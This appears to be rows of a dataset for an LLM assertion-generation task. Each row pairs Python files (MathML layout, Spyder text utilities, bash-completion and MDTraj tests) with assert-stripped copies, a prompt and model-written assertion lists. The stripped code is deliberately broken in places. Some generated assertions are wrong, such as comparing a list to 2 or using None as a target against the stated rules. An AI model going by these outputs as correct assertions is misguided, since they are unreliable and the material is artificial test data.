5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['_SUB_MAX_POSITION', '_SUP_MIN_POSITION', '_SUBSUP_MIN_DISTANCE', '_SCRIPT_HORIZONTAL_SPACING', 'elem', 'base', 'sup', 'modify_children', 'base.x0', 'base.y0', 'sup.x0', 'sup.y0', 'elem.height', 'elem.width', 'elem.axis', 'layout', 'plotter', 'children', 'strategy', 'sub', 'sub.x0', 'sub.y0', 'element', '# we assume initially that base.y0', '# then we offset all coordinates so that sub.y0', 'mindist', 'dist', 'delta', ""xml_mapping['msup']"", ""xml_mapping['msub']"", ""xml_mapping['msubsup']""]
*Code:

1from .element import *
2import warnings
3from . import munderover
4
5_SUB_MAX_POSITION          = 1/3.0 # relative to the base height
6_SUP_MIN_POSITION          = 2/3.0 # relative to the base height
7_SUBSUP_MIN_DISTANCE       = 1/3.0 # relative to base's font size
8_SCRIPT_HORIZONTAL_SPACING = 0.02  # relative to base's font size
9
10
11
12class MSup(Element):
13
14    class Strategy:
15
16	def modify_children(elem, base, sup):
17	    sup.setAttributeWeak(""scriptlevel"",  ""+1"")
18	    sup.setAttributeWeak(""displaystyle"", ""false"")
19
20	modify_children = staticmethod(modify_children)
21
22	def layout(elem, base, sup):
23	    base.x0 = 0
24	    base.y0 = 0
25	    sup.x0 = base.width + base.font_size*_SCRIPT_HORIZONTAL_SPACING
26	    sup.y0 = max(base.height*_SUP_MIN_POSITION,
27			 base.height - sup.axis)
28	    elem.height = max(sup.y0 + sup.height, base.height)
29	    elem.width = sup.x0 + sup.width
30	    elem.axis = base.axis
31
32	layout = staticmethod(layout)
33
34    
35    def __init__(self, plotter, children):
36	Element.__init__(self, plotter)
37	for child in children:
38	    self.addChild(child)
39
40    def update(self):
41	base, sup = self.children
42
43	## Honor attribute 'movablelimits'
44	base.update()
45	if (base.embellished_core is not None
46	    and base.embellished_core.getAttribute(""movablelimits"",
47						   recursive=False,
48						   default=False)
49	    and self.getAttribute(""displaystyle"").bool):
50	    strategy = munderover.MOver.Strategy
51	else:
52	    strategy = self.Strategy
53
54	strategy.modify_children(self, base, sup)
55	sup.update()
56	strategy.layout(self, base, sup)
57
58    def embellished_p(self):
59	try:
60	    return self.children[0].embellished_p()
61	except IndexError:
62	    return None
63
64class MSub(Element):
65
66    class Strategy:
67
68	def modify_children(elem, base, sub):
69	    sub.setAttributeWeak(""scriptlevel"",  ""+1"")
70	    sub.setAttributeWeak(""displaystyle"", ""false"")
71
72	modify_children = staticmethod(modify_children)
73
74	def layout(elem, base, sub):
75	    base.x0 = 0
76	    sub.x0 = base.width + base.font_size*_SCRIPT_HORIZONTAL_SPACING
77	    sub.y0 = min(base.height*_SUB_MAX_POSITION - sub.height, -sub.axis)
78	    base.y0 = -sub.y0
79	    sub.y0  = 0
80	    elem.height = max(sub.height, base.y0 + base.height)
81	    elem.width = sub.x0 + sub.width
82	    elem.axis = base.y0 + base.axis
83
84	layout = staticmethod(layout)
85
86    
87    def __init__(self, plotter, children):
88	Element.__init__(self, plotter)
89	for child in children:
90	    self.addChild(child)
91
92    def update(self):
93	base, sub = self.children
94
95	## Honor attribute 'movablelimits'
96	base.update()
97	if (base.embellished_core is not None
98	    and base.embellished_core.getAttribute(""movablelimits"",
99						   recursive=False,
100						   default=False)
101	    and self.getAttribute(""displaystyle"").bool):
102	    strategy = munderover.MUnder.Strategy
103	else:
104	    strategy = self.Strategy
105
106	strategy.modify_children(self, base, sub)
107	sub.update()
108	strategy.layout(self, base, sub)
109	
110    def embellished_p(self):
111	try:
112	    return self.children[0].embellished_p()
113	except IndexError:
114	    return None
115
116class MSubSup(Element):
117
118    class Strategy:
119
120	def modify_children(element, base, sub, sup):
121	    for elem in sub, sup:
122		elem.setAttributeWeak(""scriptlevel"",  ""+1"")
123		elem.setAttributeWeak(""displaystyle"", ""false"")
124
125	modify_children = staticmethod(modify_children)
126
127	def layout(elem, base, sub, sup):
128	    base.x0 = 0
129
130	    # we assume initially that base.y0 = 0
131
132	    sub.x0 = base.width + base.font_size*_SCRIPT_HORIZONTAL_SPACING
133	    sub.y0 = min(base.height*_SUB_MAX_POSITION - sub.height, -sub.axis)
134
135	    sup.x0 = sub.x0
136	    sup.y0 = max(base.height*_SUP_MIN_POSITION,
137			 base.height - sup.axis)
138
139	    # then we offset all coordinates so that sub.y0 = 0
140	    base.y0  = -sub.y0
141	    sup.y0  -= sub.y0
142	    sub.y0   = 0
143
144	    # make sure the subscript and superscript are separated by
145	    # a minimum distance
146	    mindist = _SUBSUP_MIN_DISTANCE*base.font_size
147	    dist = sup.y0 - (sub.y0 + sub.height)
148	    if dist < mindist:
149		delta = (mindist - dist)/2
150		sub.y0 -= delta
151		sup.y0 += delta
152
153	    elem.height = max(sup.y0 + sup.height, base.y0 + base.height)
154	    elem.width = sub.x0 + max(sub.width, sup.width)
155	    elem.axis = base.y0 + base.axis
156
157	layout = staticmethod(layout)
158    
159    def __init__(self, plotter, children):
160	Element.__init__(self, plotter)
161	for child in children:
162	    self.addChild(child)
163
164    def update(self):
165	base, sub, sup = self.children
166
167	## Honor attribute 'movablelimits'
168	base.update()
169	if (base.embellished_core is not None
170	    and base.embellished_core.getAttribute(""movablelimits"",
171						   recursive=False,
172						   default=False)
173	    and self.getAttribute(""displaystyle"").bool):
174	    strategy = munderover.MUnderOver.Strategy
175	else:
176	    strategy = self.Strategy
177
178	strategy.modify_children(self, base, sub, sup)
179	sub.update()
180	sup.update()
181	strategy.layout(self, base, sub, sup)
182
183    def embellished_p(self):
184	try:
185	    return self.children[0].embellished_p()
186	except IndexError:
187	    return None
188
189
190xml_mapping['msup']    = MSup
191xml_mapping['msub']    = MSub
192xml_mapping['msubsup'] = MSubSup
193
194",7393,"[[35, 'children', '!=', None, ""Check if children passed to MSup class __init__ method is not None""],
[87, 'children', '!=', None, ""Check if children passed to MSub class __init__ method is not None""],
[159, 'children', '!=', None, ""Check if children passed to MSubSup class __init__ method is not None""],
[41, 'children', '==', 2, ""Check if two children are passed to MSup class update method""],
[93, 'children', '==', 2, ""Check if two children are passed to MSub class update method""],
[165, 'children', '==', 3, ""Check if three children are passed to MSubSup class update method""]]"
kenshay/ImageScript,"# -*- coding: utf-8 -*-
#
# Copyright © 2009-2010 Pierre Raybaut
# Licensed under the terms of the MIT License
# (see spyderlib/__init__.py for details)

""""""
Source code text utilities
""""""
import re

# Order is important:
EOL_CHARS = ((""\r\n"", 'nt'), (""\n"", 'posix'), (""\r"", 'mac'))

ALL_LANGUAGES = {
                 'Python': ('py', 'pyw', 'python', 'ipy'),
                 'Cython': ('pyx', 'pxi', 'pxd'),
                 'Enaml': ('enaml',),
                 'Fortran77': ('f', 'for', 'f77'),
                 'Fortran': ('f90', 'f95', 'f2k'),
                 'Idl': ('pro',),
                 'Matlab': ('m',),
                 'Julia': ('jl',),
                 'Diff': ('diff', 'patch', 'rej'),
                 'GetText': ('po', 'pot'),
                 'Nsis': ('nsi', 'nsh'),
                 'Html': ('htm', 'html'),
                 'Css': ('css',),
                 'Xml': ('xml',),
                 'Js': ('js',),
                 'Json': ('json', 'ipynb'),
                 'Cpp': ('c', 'cc', 'cpp', 'cxx', 'h', 'hh', 'hpp', 'hxx'),
                 'OpenCL': ('cl',),
                 'Batch': ('bat', 'cmd', 'nt'),
                 'Ini': ('properties', 'session', 'ini', 'inf', 'reg', 'url',
                         'cfg', 'cnf', 'aut', 'iss'),
                 'Yaml':('yaml','yml'),
                 }

PYTHON_LIKE_LANGUAGES = ('Python', 'Cython', 'Enaml')

CELL_LANGUAGES = {'Python': ('#%%', '# %%', '# <codecell>', '# In[')}

def get_eol_chars(text):
    """"""Get text EOL characters""""""
    for eol_chars, _os_name in EOL_CHARS:
        if text.find(eol_chars) > -1:
            return eol_chars

def get_os_name_from_eol_chars(eol_chars):
    """"""Return OS name from EOL characters""""""
    for chars, os_name in EOL_CHARS:
        if eol_chars == chars:
            return os_name

def get_eol_chars_from_os_name(os_name):
    """"""Return EOL characters from OS name""""""
    for eol_chars, name in EOL_CHARS:
        if name == os_name:
            return eol_chars

def has_mixed_eol_chars(text):
    """"""Detect if text has mixed EOL characters""""""
    eol_chars = get_eol_chars(text)
    if eol_chars is None:
        return False
    correct_text = eol_chars.join((text+eol_chars).splitlines())
    return repr(correct_text) != repr(text)

def fix_indentation(text):
    """"""Replace tabs by spaces""""""
    return text.replace('\t', ' '*4)

    
def is_builtin(text):
    """"""Test if passed string is the name of a Python builtin object""""""
    from spyderlib.py3compat import builtins
    return text in [str(name) for name in dir(builtins)
                    if not name.startswith('_')]


def is_keyword(text):
    """"""Test if passed string is the name of a Python keyword""""""
    import keyword
    return text in keyword.kwlist
    
    
def get_primary_at(source_code, offset, retry=True):
    """"""Return Python object in *source_code* at *offset*
    Periods to the left of the cursor are carried forward 
      e.g. 'functools.par^tial' would yield 'functools.partial'
    Retry prevents infinite recursion: retry only once
    """"""
    obj = ''
    left = re.split(r""[^0-9a-zA-Z_.]"", source_code[:offset])
    if left and left[-1]:
        obj = left[-1]
    right = re.split(r""\W"", source_code[offset:])
    if right and right[0]:
        obj += right[0]
    if obj and obj[0].isdigit():
        obj = ''
    # account for opening chars with no text to the right
    if not obj and retry and offset and source_code[offset - 1] in '([.':
        return get_primary_at(source_code, offset - 1, retry=False)
    return obj


def split_source(source_code):
    '''Split source code into lines
    '''
    eol_chars = get_eol_chars(source_code)
    if eol_chars:
        return source_code.split(eol_chars)
    else:
        return [source_code]


def get_identifiers(source_code):
    '''Split source code into python identifier-like tokens'''
    tokens = set(re.split(r""[^0-9a-zA-Z_.]"", source_code))
    valid = re.compile(r'[a-zA-Z_]')
    return [token for token in tokens if re.match(valid, token)]


if __name__ == '__main__':
    code = 'import functools\nfunctools.partial'
    assert get_primary_at(code, len(code)) == 'functools.partial'
    assert get_identifiers(code) == ['import', 'functools', 
                                     'functools.partial']
    assert split_source(code) == ['import functools', 'functools.partial']
    code = code.replace('\n', '\r\n')
    assert split_source(code) == ['import functools', 'functools.partial']
","
1# -*- coding: utf-8 -*-
2#
3# Copyright © 2009-2010 Pierre Raybaut
4# Licensed under the terms of the MIT License
5# (see spyderlib/__init__.py for details)
6
7""""""
8Source code text utilities
9""""""
10import re
11
12# Order is important:
13EOL_CHARS = ((""\r\n"", 'nt'), (""\n"", 'posix'), (""\r"", 'mac'))
14
15ALL_LANGUAGES = {
16                 'Python': ('py', 'pyw', 'python', 'ipy'),
17                 'Cython': ('pyx', 'pxi', 'pxd'),
18                 'Enaml': ('enaml',),
19                 'Fortran77': ('f', 'for', 'f77'),
20                 'Fortran': ('f90', 'f95', 'f2k'),
21                 'Idl': ('pro',),
22                 'Matlab': ('m',),
23                 'Julia': ('jl',),
24                 'Diff': ('diff', 'patch', 'rej'),
25                 'GetText': ('po', 'pot'),
26                 'Nsis': ('nsi', 'nsh'),
27                 'Html': ('htm', 'html'),
28                 'Css': ('css',),
29                 'Xml': ('xml',),
30                 'Js': ('js',),
31                 'Json': ('json', 'ipynb'),
32                 'Cpp': ('c', 'cc', 'cpp', 'cxx', 'h', 'hh', 'hpp', 'hxx'),
33                 'OpenCL': ('cl',),
34                 'Batch': ('bat', 'cmd', 'nt'),
35                 'Ini': ('properties', 'session', 'ini', 'inf', 'reg', 'url',
36                         'cfg', 'cnf', 'aut', 'iss'),
37                 'Yaml':('yaml','yml'),
38                 }
39
40PYTHON_LIKE_LANGUAGES = ('Python', 'Cython', 'Enaml')
41
42CELL_LANGUAGES = {'Python': ('#%%', '# %%', '# <codecell>', '# In[')}
43
44def get_eol_chars(text):
45    """"""Get text EOL characters""""""
46    for eol_chars, _os_name in EOL_CHARS:
47        if text.find(eol_chars) > -1:
48            return eol_chars
49
50def get_os_name_from_eol_chars(eol_chars):
51    """"""Return OS name from EOL characters""""""
52    for chars, os_name in EOL_CHARS:
53        if eol_chars == chars:
54            return os_name
55
56def get_eol_chars_from_os_name(os_name):
57    """"""Return EOL characters from OS name""""""
58    for eol_chars, name in EOL_CHARS:
59        if name == os_name:
60            return eol_chars
61
62def has_mixed_eol_chars(text):
63    """"""Detect if text has mixed EOL characters""""""
64    eol_chars = get_eol_chars(text)
65    if eol_chars is None:
66        return False
67    correct_text = eol_chars.join((text+eol_chars).splitlines())
68    return repr(correct_text) != repr(text)
69
70def fix_indentation(text):
71    """"""Replace tabs by spaces""""""
72    return text.replace('\t', ' '*4)
73
74    
75def is_builtin(text):
76    """"""Test if passed string is the name of a Python builtin object""""""
77    from spyderlib.py3compat import builtins
78    return text in [str(name) for name in dir(builtins)
79                    if not name.startswith('_')]
80
81
82def is_keyword(text):
83    """"""Test if passed string is the name of a Python keyword""""""
84    import keyword
85    return text in keyword.kwlist
86    
87    
88def get_primary_at(source_code, offset, retry=True):
89    """"""Return Python object in *source_code* at *offset*
90    Periods to the left of the cursor are carried forward 
91      e.g. 'functools.par^tial' would yield 'functools.partial'
92    Retry prevents infinite recursion: retry only once
93    """"""
94    obj = ''
95    left = re.split(r""[^0-9a-zA-Z_.]"", source_code[:offset])
96    if left and left[-1]:
97        obj = left[-1]
98    right = re.split(r""\W"", source_code[offset:])
99    if right and right[0]:
100        obj += right[0]
101    if obj and obj[0].isdigit():
102        obj = ''
103    # account for opening chars with no text to the right
104    if not obj and retry and offset and source_code[offset - 1] in '([.':
105        return get_primary_at(source_code, offset - 1, retry=False)
106    return obj
107
108
109def split_source(source_code):
110    '''Split source code into lines
111    '''
112    eol_chars = get_eol_chars(source_code)
113    if eol_chars:
114        return source_code.split(eol_chars)
115    else:
116        return [source_code]
117
118
119def get_identifiers(source_code):
120    '''Split source code into python identifier-like tokens'''
121    tokens = set(re.split(r""[^0-9a-zA-Z_.]"", source_code))
122    valid = re.compile(r'[a-zA-Z_]')
123    return [token for token in tokens if re.match(valid, token)]
124
125
126if __name__ == '__main__':
127    code = 'import functools\nfunctools.partial'
128                                     'functools.partial']
129    code = code.replace('\n', '\r\n')
130","[['get_primary_at(code', '==', 'True'], ['get_identifiers(code)', '==', ""['import'""], ['split_source(code)', '==', ""['import functools'""], ['split_source(code)', '==', ""['import functools'""]]",4,4,1.0,0.0008934554389099,"['EOL_CHARS', 'ALL_LANGUAGES', 'PYTHON_LIKE_LANGUAGES', 'CELL_LANGUAGES', 'text', 'eol_chars', 'os_name', 'correct_text', 'source_code', 'offset', 'retry', 'obj', 'left', 'right', 'tokens', 'valid', 'code']",17,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['EOL_CHARS', 'ALL_LANGUAGES', 'PYTHON_LIKE_LANGUAGES', 'CELL_LANGUAGES', 'text', 'eol_chars', 'os_name', 'correct_text', 'source_code', 'offset', 'retry', 'obj', 'left', 'right', 'tokens', 'valid', 'code']
*Code:

1# -*- coding: utf-8 -*-
2#
3# Copyright © 2009-2010 Pierre Raybaut
4# Licensed under the terms of the MIT License
5# (see spyderlib/__init__.py for details)
6
7""""""
8Source code text utilities
9""""""
10import re
11
12# Order is important:
13EOL_CHARS = ((""\r\n"", 'nt'), (""\n"", 'posix'), (""\r"", 'mac'))
14
15ALL_LANGUAGES = {
16                 'Python': ('py', 'pyw', 'python', 'ipy'),
17                 'Cython': ('pyx', 'pxi', 'pxd'),
18                 'Enaml': ('enaml',),
19                 'Fortran77': ('f', 'for', 'f77'),
20                 'Fortran': ('f90', 'f95', 'f2k'),
21                 'Idl': ('pro',),
22                 'Matlab': ('m',),
23                 'Julia': ('jl',),
24                 'Diff': ('diff', 'patch', 'rej'),
25                 'GetText': ('po', 'pot'),
26                 'Nsis': ('nsi', 'nsh'),
27                 'Html': ('htm', 'html'),
28                 'Css': ('css',),
29                 'Xml': ('xml',),
30                 'Js': ('js',),
31                 'Json': ('json', 'ipynb'),
32                 'Cpp': ('c', 'cc', 'cpp', 'cxx', 'h', 'hh', 'hpp', 'hxx'),
33                 'OpenCL': ('cl',),
34                 'Batch': ('bat', 'cmd', 'nt'),
35                 'Ini': ('properties', 'session', 'ini', 'inf', 'reg', 'url',
36                         'cfg', 'cnf', 'aut', 'iss'),
37                 'Yaml':('yaml','yml'),
38                 }
39
40PYTHON_LIKE_LANGUAGES = ('Python', 'Cython', 'Enaml')
41
42CELL_LANGUAGES = {'Python': ('#%%', '# %%', '# <codecell>', '# In[')}
43
44def get_eol_chars(text):
45    """"""Get text EOL characters""""""
46    for eol_chars, _os_name in EOL_CHARS:
47        if text.find(eol_chars) > -1:
48            return eol_chars
49
50def get_os_name_from_eol_chars(eol_chars):
51    """"""Return OS name from EOL characters""""""
52    for chars, os_name in EOL_CHARS:
53        if eol_chars == chars:
54            return os_name
55
56def get_eol_chars_from_os_name(os_name):
57    """"""Return EOL characters from OS name""""""
58    for eol_chars, name in EOL_CHARS:
59        if name == os_name:
60            return eol_chars
61
62def has_mixed_eol_chars(text):
63    """"""Detect if text has mixed EOL characters""""""
64    eol_chars = get_eol_chars(text)
65    if eol_chars is None:
66        return False
67    correct_text = eol_chars.join((text+eol_chars).splitlines())
68    return repr(correct_text) != repr(text)
69
70def fix_indentation(text):
71    """"""Replace tabs by spaces""""""
72    return text.replace('\t', ' '*4)
73
74    
75def is_builtin(text):
76    """"""Test if passed string is the name of a Python builtin object""""""
77    from spyderlib.py3compat import builtins
78    return text in [str(name) for name in dir(builtins)
79                    if not name.startswith('_')]
80
81
82def is_keyword(text):
83    """"""Test if passed string is the name of a Python keyword""""""
84    import keyword
85    return text in keyword.kwlist
86    
87    
88def get_primary_at(source_code, offset, retry=True):
89    """"""Return Python object in *source_code* at *offset*
90    Periods to the left of the cursor are carried forward 
91      e.g. 'functools.par^tial' would yield 'functools.partial'
92    Retry prevents infinite recursion: retry only once
93    """"""
94    obj = ''
95    left = re.split(r""[^0-9a-zA-Z_.]"", source_code[:offset])
96    if left and left[-1]:
97        obj = left[-1]
98    right = re.split(r""\W"", source_code[offset:])
99    if right and right[0]:
100        obj += right[0]
101    if obj and obj[0].isdigit():
102        obj = ''
103    # account for opening chars with no text to the right
104    if not obj and retry and offset and source_code[offset - 1] in '([.':
105        return get_primary_at(source_code, offset - 1, retry=False)
106    return obj
107
108
109def split_source(source_code):
110    '''Split source code into lines
111    '''
112    eol_chars = get_eol_chars(source_code)
113    if eol_chars:
114        return source_code.split(eol_chars)
115    else:
116        return [source_code]
117
118
119def get_identifiers(source_code):
120    '''Split source code into python identifier-like tokens'''
121    tokens = set(re.split(r""[^0-9a-zA-Z_.]"", source_code))
122    valid = re.compile(r'[a-zA-Z_]')
123    return [token for token in tokens if re.match(valid, token)]
124
125
126if __name__ == '__main__':
127    code = 'import functools\nfunctools.partial'
128                                     'functools.partial']
129    code = code.replace('\n', '\r\n')
130",6069,"[[44, ""text"", ""!="", None, ""input text can't be None in function get_eol_chars""], 
 [50, ""eol_chars"", ""!="", None, ""eol_chars can't be None in function get_os_name_from_eol_chars""], 
 [56, ""os_name"", ""!="", None, ""os_name can't be None in function get_eol_chars_from_os_name""], 
 [62, ""text"", ""!="", None, ""input text can't be None in function has_mixed_eol_chars""], 
 [70, ""text"", ""!="", None, ""input text can't be None in function fix_indentation""], 
 [75, ""text"", ""!="", None, ""input text can't be None in function is_builtin""], 
 [82, ""text"", ""!="", None, ""input text can't be None in function is_keyword""], 
 [88, ""source_code"", ""!="", None, ""source_code can't be None in function get_primary_at""], 
 [88, ""offset"", "">="", 0, ""offset can't be negative in function get_primary_at""], 
 [109, ""source_code"", ""!="", None, ""source_code can't be None in function split_source""], 
 [119, ""source_code"", ""!="", None, ""source_code can't be None in function get_identifiers""]
]"
algorythmic/bash-completion,"import pytest


class TestPydoc:
    @pytest.mark.complete(""pydoc r"", require_cmd=True)
    def test_1(self, completion):
        assert completion

    @pytest.mark.complete(""pydoc -"", require_cmd=True)
    def test_2(self, completion):
        assert completion
","
1import pytest
2
3
4class TestPydoc:
5    @pytest.mark.complete(""pydoc r"", require_cmd=True)
6    def test_1(self, completion):
7
8    @pytest.mark.complete(""pydoc -"", require_cmd=True)
9    def test_2(self, completion):
10","[['completion', '==', 'True'], ['completion', '==', 'True']]",2,2,1.0,0.0075757575757575,['completion'],1,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['completion']
*Code:

1import pytest
2
3
4class TestPydoc:
5    @pytest.mark.complete(""pydoc r"", require_cmd=True)
6    def test_1(self, completion):
7
8    @pytest.mark.complete(""pydoc -"", require_cmd=True)
9    def test_2(self, completion):
10",1618,"[[6, 'completion', '!=', None, 'input variable for the test should not be None'],
[9, 'completion', '!=', None, 'input variable for the test should not be None']]"
mattwthompson/mdtraj,"##############################################################################
# MDTraj: A Python Library for Loading, Saving, and Manipulating
#         Molecular Dynamics Trajectories.
# Copyright 2012-2013 Stanford University and the Authors
#
# Authors: Kyle A. Beauchamp
# Contributors:
#
# MDTraj is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as
# published by the Free Software Foundation, either version 2.1
# of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with MDTraj. If not, see <http://www.gnu.org/licenses/>.
##############################################################################

import mdtraj as md
from mdtraj.testing import eq
from mdtraj.formats import mol2
from distutils.spawn import find_executable
import tarfile
import pickle
import os
import numpy as np
import scipy.sparse
import pytest


def test_load_mol2(get_fn):
    trj = md.load(get_fn('imatinib.mol2'))
    ref_trj = md.load(get_fn('imatinib.pdb'))
    eq(trj.xyz, ref_trj.xyz)

    ref_top, ref_bonds = ref_trj.top.to_dataframe()
    top, bonds = trj.top.to_dataframe()
    # PDB Does not have bond order, ensure that the equality fails
    try:
        eq(bonds, ref_bonds)
    except AssertionError:
        # This is what we wanted to happen, its fine
        pass
    else:
        raise AssertionError(""Reference bonds with no bond order should not equal Mol2 bonds with bond order"")
    # Strip bond order info since PDB does not have it
    bonds[:, -2:] = np.zeros([bonds.shape[0], 2])
    eq(bonds, ref_bonds)


@pytest.mark.skipif(find_executable('obabel') is None, reason='Requires obabel')
@pytest.mark.skipif(os.environ.get(""TRAVIS"", None) == 'true', reason=""Skip on Travis."")
def test_load_freesolv_gaffmol2_vs_sybylmol2_vs_obabelpdb(get_fn, tmpdir):
    tar_filename = ""freesolve_v0.3.tar.bz2""
    tar = tarfile.open(get_fn(tar_filename), mode=""r:bz2"")
    os.chdir(str(tmpdir))
    tar.extractall()
    tar.close()

    with open(""./v0.3/database.pickle"", 'rb') as f:
        database = pickle.load(f, encoding='latin-1')

    for key in database:
        gaff_filename = ""./v0.3/mol2files_gaff/%s.mol2"" % key
        pdb_filename = ""./v0.3/mol2files_gaff/%s.pdb"" % key
        sybyl_filename = ""./v0.3/mol2files_sybyl/%s.mol2"" % key

        cmd = ""obabel -imol2 %s -opdb > %s 2>/dev/null"" % (sybyl_filename, pdb_filename)
        assert os.system(cmd) == 0

        t_pdb = md.load(pdb_filename)
        t_gaff = md.load(gaff_filename)
        t_sybyl = md.load(sybyl_filename)

        eq(t_pdb.n_atoms, t_gaff.n_atoms)
        eq(t_pdb.n_atoms, t_sybyl.n_atoms)

        eq(t_pdb.n_frames, t_gaff.n_frames)
        eq(t_pdb.n_frames, t_gaff.n_frames)

        eq(t_pdb.xyz, t_gaff.xyz, decimal=4)
        eq(t_pdb.xyz, t_sybyl.xyz, decimal=4)

        top_pdb, bonds_pdb = t_pdb.top.to_dataframe()
        top_gaff, bonds_gaff = t_gaff.top.to_dataframe()
        top_sybyl, bonds_sybyl = t_sybyl.top.to_dataframe()

        eq(top_sybyl.name.values, top_pdb.name.values)

        # eq(top_gaff.name.values, top_sybyl.name.values)  # THEY CAN HAVE DIFFERENT NAMES, so this isn't TRUE!

        def make_bonds_comparable(bond_array):
            """"""Create a bond connectivity matrix from a numpy array of atom pairs.  Avoids having to compare the order in which bonds are listed.""""""
            n_bonds = len(bond_array)
            data = np.ones(n_bonds)
            i = bond_array[:, 0]
            j = bond_array[:, 1]
            matrix = scipy.sparse.coo_matrix((data, (i, j)), shape=(t_pdb.n_atoms, t_pdb.n_atoms)).toarray()
            return matrix + matrix.T  # Symmetrize to account for (a ~ b) versus (b ~ a)

        bond_matrix_pdb = make_bonds_comparable(bonds_pdb)
        bond_matrix_gaff = make_bonds_comparable(bonds_gaff)
        bond_matrix_sybyl = make_bonds_comparable(bonds_sybyl)

        eq(bond_matrix_pdb, bond_matrix_gaff)
        eq(bond_matrix_pdb, bond_matrix_sybyl)

        # Third row from mol2 file copied below, used in testing.
        #       3 N1          8.5150   -0.1620    1.3310 n3        1 LIG     -0.732600


def test_mol2_dataframe(get_fn):
    top, bonds = mol2.mol2_to_dataframes(get_fn(""imatinib.mol2""))
    eq(top.name[2], ""N1"")
    eq(top.atype[2], ""n3"")
    eq(top.resName[2], ""LIG"")
    eq(float(top.charge[2]), -0.732600)


def test_mol2_dataframe_status(get_fn):
    atoms, bonds = mol2.mol2_to_dataframes(get_fn('adp.mol2'))
    assert atoms['charge'][1] == 1.3672
    assert atoms['status'][1] == '****'


def test_mol2_warnings(get_fn):
    trj = md.load_mol2(get_fn('lysozyme-ligand-tripos.mol2'))


def test_mol2_status_bits(get_fn):
    trj = md.load_mol2(get_fn('status-bits.mol2'))
    eq(trj.topology.n_atoms, 18)
    eq(trj.topology.n_bonds, 18)


def test_mol2_without_bonds(get_fn):
    trj = md.load_mol2(get_fn('li.mol2'))
    assert trj.topology.n_bonds == 0



def test_mol2_element_name(get_fn):
    trj = md.load_mol2(get_fn('cl.mol2'))
    top, bonds = trj.top.to_dataframe()
    assert top.iloc[0]['element'] == 'Cl'

    
@pytest.mark.parametrize('mol2_file', [('li.mol2'),
('lysozyme-ligand-tripos.mol2'), ('imatinib.mol2'),
('status-bits.mol2'), ('adp.mol2'), ('water_acn.mol2')])
def test_load_all_mol2(mol2_file, get_fn):
    trj = md.load_mol2(get_fn(mol2_file))

def test_mol2_n_residues(get_fn):
    trj = md.load_mol2(get_fn('water_acn.mol2'))
    assert trj.n_residues == 10
","
1##############################################################################
2# MDTraj: A Python Library for Loading, Saving, and Manipulating
3#         Molecular Dynamics Trajectories.
4# Copyright 2012-2013 Stanford University and the Authors
5#
6# Authors: Kyle A. Beauchamp
7# Contributors:
8#
9# MDTraj is free software: you can redistribute it and/or modify
10# it under the terms of the GNU Lesser General Public License as
11# published by the Free Software Foundation, either version 2.1
12# of the License, or (at your option) any later version.
13#
14# This library is distributed in the hope that it will be useful,
15# but WITHOUT ANY WARRANTY; without even the implied warranty of
16# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
17# GNU Lesser General Public License for more details.
18#
19# You should have received a copy of the GNU Lesser General Public
20# License along with MDTraj. If not, see <http://www.gnu.org/licenses/>.
21##############################################################################
22
23import mdtraj as md
24from mdtraj.testing import eq
25from mdtraj.formats import mol2
26from distutils.spawn import find_executable
27import tarfile
28import pickle
29import os
30import numpy as np
31import scipy.sparse
32import pytest
33
34
35def test_load_mol2(get_fn):
36    trj = md.load(get_fn('imatinib.mol2'))
37    ref_trj = md.load(get_fn('imatinib.pdb'))
38    eq(trj.xyz, ref_trj.xyz)
39
40    ref_top, ref_bonds = ref_trj.top.to_dataframe()
41    top, bonds = trj.top.to_dataframe()
42    # PDB Does not have bond order, ensure that the equality fails
43    try:
44        eq(bonds, ref_bonds)
45    except AssertionError:
46        # This is what we wanted to happen, its fine
47        pass
48    else:
49        raise AssertionError(""Reference bonds with no bond order should not equal Mol2 bonds with bond order"")
50    # Strip bond order info since PDB does not have it
